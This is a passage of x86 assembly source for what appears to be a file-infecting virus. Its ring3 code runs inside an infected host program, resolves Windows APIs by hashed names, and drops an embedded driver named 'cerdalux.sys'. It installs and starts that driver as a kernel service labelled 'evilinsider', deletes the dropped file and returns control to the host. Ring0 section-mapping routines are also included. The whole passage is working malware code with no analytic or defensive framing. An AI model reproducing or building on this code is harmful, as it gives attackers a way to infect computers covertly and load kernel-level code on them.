        push    01000h
        push    eax
        push    ecx
        push    NtCurrentProcess
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ZwMapViewOfSection.va]
        pop     esi
        pop     ecx
        mov     ecx, eax
        xor     eax, eax
        cmp     ecx, STATUS_IMAGE_NOT_AT_BASE
        jz      map_imagefile_ring0_ret
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
        inc     eax
map_imagefile_ring0_ret:
        ret
 
        ; in:
        ;   esi = bade addr
        ;   edi = section handle
        ; out:  nothing
 
unmap_section_ring0:
        push    esi
        push    NtCurrentProcess
        call    dword ptr [ebx + ring0data.api.ntos.ZwUnmapViewOfSection.va]
close_section_ring0:
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
        ret
 
        ; in:
        ;   ebx = module base
        ;   esi = ptr table api crcs
        ;   edi = ptr buffer api addrs
        ; out: nothing
 
get_apis:
        mov     eax, ebx
        stosd
        mov     edx, dword ptr [ebx + mzhdr.mz_lfanew]
        add     edx, ebx
        mov     edx, dword ptr [edx + pehdr.pe_dd_export.ddir_rva]
        add     edx, ebx
        push    ebp
        xchg    ebp, esi
        mov     esi, dword ptr [edx + pedir_export.rvaofnames]
        add     esi, ebx
        mov     ecx, dword ptr [edx + pedir_export.numofnames]
next_api:
        jecxz   get_apis_end
        dec     ecx
        lodsd
        add     eax, ebx
        call    gen_crc32_szname
        cmp     eax, dword ptr [ebp]
        jnz     next_api
get_api_addr:
        push    ecx
        mov     eax, dword ptr [edx + pedir_export.numofnames]
        sub     eax, ecx
        dec     eax
        mov     ecx, dword ptr [edx + pedir_export.rvaofordinals]
        add     ecx, ebx
        movzx   eax, word ptr [ecx + eax * 2]
        mov     ecx, dword ptr [edx + pedir_export.rvaoffunctions]
        add     ecx, ebx
        lea     eax, dword ptr [ecx + eax * 4]
        push    eax
        mov     eax, dword ptr [eax]
        add     eax, ebx
        stosd
        pop     eax
        stosd
        pop     ecx
        add     ebp, 4
        cmp     dword ptr [ebp], 0
        jne     next_api
        xchg    esi, ebp
        lodsd
get_apis_end:
        pop     ebp
        ret
 
        ;--------------------------------------
        ; ring3 code
        ;--------------------------------------
 
ring3_start:
 
        pushad
        call    getdelta
        @ring3seh_setup_frame <jmp remove_seh>
        assume  fs: nothing
        mov     eax, fs:[030h]
        mov     eax, dword ptr [eax + 0Ch]
        mov     esi, dword ptr [eax + 01Ch]
        lodsd
        mov     ebx, dword ptr [eax + 08h]
        call    get_ring3_api
kerncrc_begin:
        dd      (kern_api_count shr 1) + 1 dup(0)
kerncrc_end:
        kern_name   dd  0
get_ring3_api:
        pop     esi
        sub     esp, size ring3data
        mov     edi, esp
        call    get_apis
        call    get_extra_userapi
        db  "advapi32.dll", 0h
advapicrc_begin:
        dd      (adv_api_count shr 1) + 1 dup(0)
advapicrc_end:
        adv_name    dd  0
        db  "ntdll.dll", 0h
ntdllcrc_begin:
        dd      (ntdll_api_count shr 1) + 1 dup(0)
ntdllcrc_end:
        ntdll_name  dd  0
        db  -1
get_extra_userapi:
        pop     esi
load_module:
        push    esi
        call    dword ptr [esp + 4 + ring3data.api.kern.LoadLibraryA.va]
        mov     ebx, eax
        test    ebx, ebx
        jz      jmp_to_host
        @endsz
        call    get_apis
        lodsd
        cmp byte ptr [esi], -1
        jnz load_module
load_user_api_end:
        mov     ebx, esp
is_drv_present:
        xor     eax, eax
        add     eax, 0657Fh
        shl     eax, 1
        push    eax
        shr     eax, 16
        add     eax, 05F5Fh
        shl     eax, 1
        push    eax
        call    dword ptr [ebx + ring3data.api.ntdll.ZwEnumerateBootEntries.va]        
        test    eax, eax
        jz      jmp_to_host
        xor     eax, eax
        push    eax
        push    eax
        push    CREATE_ALWAYS
        push    eax
        push    eax
        push    GENERIC_READ or GENERIC_WRITE
        lea     eax, dword ptr [ebp + (offset drv_aname - offset delta)]
        push    eax
        call    dword ptr [ebx + ring3data.api.kern.CreateFileA.va]
        test    eax, eax
        jz      jmp_to_host
        mov     dword ptr [ebx + ring3data.file_handle], eax
        mov     edi, offset drv_end - offset drv_begin
        mov     esi, edi
        lea     ecx, dword ptr [ebp + ((offset drv_begin + sys_body.sys_pe_hdr.pe_ophdr_filealign) - offset delta)]
        mov     ecx, dword ptr [ecx]
        dec     ecx
        add     esi, ecx
        not     ecx
        and     esi, ecx
        xor     eax, eax
        push    eax
        push    esi
        push    eax
        push    PAGE_READWRITE
        push    eax
        push    dword ptr [ebx + ring3data.file_handle]
        call    dword ptr [ebx + ring3data.api.kern.CreateFileMappingA.va]
        mov     dword ptr [ebx + ring3data.map_handle], eax
        test    dword ptr [ebx + ring3data.map_handle], eax
        jz      close_file
        xor     edx, edx
        push    esi
        push    edx
        push    edx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebx + ring3data.api.kern.MapViewOfFile.va]
        mov     dword ptr [ebx + ring3data.map_addr], eax
        test    dword ptr [ebx + ring3data.map_addr], eax
        jnz     copy_drv_to_map
close_map:
        push    dword ptr [ebx + ring3data.map_handle]
        call    dword ptr [ebx + ring3data.api.kern.CloseHandle.va]
close_file:
        push    dword ptr [ebx + ring3data.file_handle]
        call    dword ptr [ebx + ring3data.api.kern.CloseHandle.va]
        cmp     dword ptr [ebx + ring3data.map_handle], 0
        jz      jmp_to_host
        cmp     dword ptr [ebx + ring3data.map_addr], 0
        jz      jmp_to_host
        ret
copy_drv_to_map:
        xor     edx, edx
        push    edx
        xchg    eax, edi
        push    4
        pop     ecx
        div     ecx
        push    esi
        push    edi
        mov     ecx, eax
        lea     esi, dword ptr [ebp + (offset drv_begin - offset delta)]
        rep     movsd
        xchg    ecx, edx
        rep     movsb
calc_checksum:
        pop     edi
        and     dword ptr [edi + sys_body.sys_pe_hdr.pe_ophdr_checksum], 0
        mov     esi, dword ptr [esp]
        mov     ecx, esi
        inc     ecx
        shr     ecx, 1
        xor     eax, eax
        mov     edx, edi
        clc
cksum:  adc     ax, word ptr [edx]
        inc     edx
        inc     edx
        loop    cksum
        pop     dword ptr [edi + sys_body.sys_pe_hdr.pe_ophdr_checksum]
        adc     dword ptr [edi + sys_body.sys_pe_hdr.pe_ophdr_checksum], eax
unmap_file:
        push    dword ptr [ebx + ring3data.map_addr]
        call    dword ptr [ebx + ring3data.api.kern.UnmapViewOfFile.va]
        call    close_map
load_drv:
        xor     edi, edi
        push    SC_MANAGER_ALL_ACCESS
        push    edi
        push    edi
        call    dword ptr [ebx + ring3data.api.adv.OpenSCManagerA.va]
        test    eax, eax
        jz      jmp_to_host
        mov     dword ptr [ebx + ring3data.scm_handle], eax
        push    PAGE_READWRITE
        push    MEM_COMMIT
        push    1024
        push    edi
        call    dword ptr [ebx + ring3data.api.kern.VirtualAlloc.va]
        mov     dword ptr [ebx + ring3data.buff], eax
        call    is_service_installed
delete_service:
        push    eax
        push    eax
        push    dword ptr [ebx + ring3data.buff]
        push    SERVICE_CONTROL_STOP
        push    eax
        call    dword ptr [ebx + ring3data.api.adv.ControlService.va]
        call    dword ptr [ebx + ring3data.api.adv.DeleteService.va]
        call    dword ptr [ebx + ring3data.api.adv.CloseServiceHandle.va]
        jmp     create_start_service
is_service_installed:
        push    SERVICE_ALL_ACCESS
        lea     eax, dword ptr [ebp + (offset drv_aname - offset delta)]
        push    eax
        push    dword ptr [ebx + ring3data.scm_handle]
        call    dword ptr [ebx + ring3data.api.adv.OpenServiceA.va]
        test    eax, eax
        jnz     delete_service
create_start_service:
        mov     esi, dword ptr [ebx + ring3data.buff]
        push    esi
        lodsd
        push    esi
        push    1024
        lea     eax, dword ptr [ebp + (offset drv_aname - offset delta)]
        push    eax
        call    dword ptr [ebx + ring3data.api.kern.GetFullPathNameA.va]
        mov     ecx, eax
        jecxz   end_load_srv
        push    7
        pop     ecx
        push    edi
        loop    $-1
        push    esi
        push    SERVICE_ERROR_IGNORE
        push    SERVICE_DEMAND_START
        push    SERVICE_KERNEL_DRIVER
        push    SERVICE_ALL_ACCESS
        lea     eax, dword ptr [ebp + (offset drv_desc - offset delta)]
        push    eax
        lea     eax, dword ptr [ebp + (offset drv_aname - offset delta)]
        push    eax
        push    dword ptr [ebx + ring3data.scm_handle]
        call    dword ptr [ebx + ring3data.api.adv.CreateServiceA.va]
        mov     dword ptr [ebx + ring3data.service_handle], eax
        push    eax
        call    dword ptr [ebx + ring3data.api.adv.StartServiceA.va]
end_load_srv:
        push    dword ptr [ebx + ring3data.service_handle]
        call    dword ptr [ebx + ring3data.api.adv.CloseServiceHandle.va]
        push    dword ptr [ebx + ring3data.scm_handle]
        call    dword ptr [ebx + ring3data.api.adv.CloseServiceHandle.va]
        push    dword ptr [ebx + ring3data.buff]
        call    dword ptr [ebx + ring3data.api.kern.VirtualFree.va]
        lea     eax, dword ptr [ebp + (offset drv_aname - offset delta)]
        push    eax
        call    dword ptr [ebx + ring3api.kern.DeleteFileA.va]
jmp_to_host:
        add     esp, size ring3data
        remove_seh:
        @ring3seh_remove_frame
        popad
        mov     eax, offset host_start
host_start_ep   equ $-4
        jmp     eax
ring3_end:
 
        ;--------------------------------------
        ; some global data
        ;--------------------------------------
 
        drv_aname           db  "cerdalux.sys",0h
        drv_desc            db  "evilinsider",0h
        systemroot          db  "windows"
        exe_ext             db  ".exe"
        UCSTR               ufpath_ntdll, "\??\C:\Windows\System32\ntdll.dll", 0
        UCSTR               hal_api_uname, "HalInitSystem", 0
        UCSTR               hal_uname, "hal.dll", 0
 
drvcode_end:
drv_end:
end start